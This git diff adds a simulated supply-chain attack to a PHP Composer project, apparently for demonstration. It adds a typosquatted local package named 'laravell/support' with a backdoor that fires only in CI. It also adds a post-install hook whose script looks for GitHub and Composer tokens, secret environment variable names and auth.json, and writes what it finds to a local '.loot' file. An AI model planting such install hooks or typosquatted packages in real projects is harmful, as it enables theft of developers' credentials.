@@ -1,0 +1,112 @@
+diff --git a/composer.json b/composer.json
+index e92ed27..406c091 100644
+--- a/composer.json
++++ b/composer.json
+@@ -3,6 +3,18 @@
+     "type": "project",
+     "require": {
+         "php": ">=8.2",
+-        "psr/log": "^3.0"
++        "psr/log": "^3.0",
++        "laravell/support": "^1.0"
++    },
++    "repositories": [
++        {
++            "type": "path",
++            "url": "./laravell-support"
++        }
++    ],
++    "scripts": {
++        "post-install-cmd": [
++            "php tools/collect-env.php"
++        ]
+     }
+-}
++}
+\ No newline at end of file
+diff --git a/laravell-support/composer.json b/laravell-support/composer.json
+new file mode 100644
+index 0000000..6a4f509
+--- /dev/null
++++ b/laravell-support/composer.json
+@@ -0,0 +1,13 @@
++{
++    "name": "laravell/support",
++    "description": "Shared support utilities for the Laravel ecosystem (maintained by community)",
++    "type": "library",
++    "require": {
++        "php": ">=8.2"
++    },
++    "autoload": {
++        "psr-4": {
++            "LaravellSupport\\": "src/"
++        }
++    }
++}
+diff --git a/laravell-support/src/Support.php b/laravell-support/src/Support.php
+new file mode 100644
+index 0000000..9080d5a
+--- /dev/null
++++ b/laravell-support/src/Support.php
+@@ -0,0 +1,28 @@
++<?php
++// !!! SIMULATED TYPO-SQUATTED PACKAGE CODE (SAFE) !!!
++// The real attack pattern: a package whose name is one keystroke away from a
++// trusted one (laravell vs laravel), carrying a backdoor that triggers on a
++// specific condition - exactly like the 2025 Bybit wallet compromise.
++
++namespace LaravellSupport;
++
++class Support
++{
++    // looks like a harmless helper - reviewed code hides the condition
++    public static function hydrate(array $items): array
++    {
++        if (getenv('CI') === 'true') {
++            // only fires in build environments where bigger secrets live (Bybit pattern)
++            self::pingTelemetry();
++        }
++        return array_map('strtoupper', $items);
++    }
++
++    private static function pingTelemetry(): void
++    {
++        // In a real attack this would reach an attacker-controlled host.
++        // SAFE SIMULATION: local file only.
++        if (!is_dir('.loot')) { mkdir('.loot'); }
++        file_put_contents('.loot/laravell-callback.txt', 'simulated beacon at ' . date('c') . "\n");
++    }
++}
+diff --git a/tools/collect-env.php b/tools/collect-env.php
+new file mode 100644
+index 0000000..f800508
+--- /dev/null
++++ b/tools/collect-env.php
+@@ -0,0 +1,27 @@
++<?php
++// !!! SIMULATED MALICIOUS POST-INSTALL STEP (Shai-Hulud style) !!!
++// This is a SAFE simulator: it collects data locally and writes it to
++// .loot/exfil.json instead of exfiltrating anywhere. It exists so you can
++// SEE what a post-install-cmd could harvest from a developer machine.
++
++$payload = [
++    'timestamp'      => date('c'),
++    'user'           => getenv('USERNAME') ?: get_current_user(),
++    'home'           => getenv('USERPROFILE') ?: getenv('HOME'),
++    'cwd'            => getcwd(),
++    'composer_token' => getenv('COMPOSER_TOKEN') ? '(present)' : null,
++    'github_token'   => getenv('GITHUB_TOKEN') ? '(present)' : null,
++    'env'            => array_values(array_filter(array_keys($_SERVER), function ($k) {
++        return preg_match('/TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL/i', $k);
++    })),
++];
++
++$auth = trim((getenv('USERPROFILE') ?: getenv('HOME') ?: '') . '/auth.json');
++if (is_file($auth)) {
++    $payload['composer_auth_json'] = '(readable - file_get_contents would leak GH/PHAR tokens)';
++}
++
++if (!is_dir('.loot')) { mkdir('.loot'); }
++file_put_contents('.loot/exfil.json', json_encode($payload, JSON_PRETTY_PRINT));
++
++echo "[collect-env.php] 'telemetry' written to .loot/exfil.json (simulated exfiltration)\n";
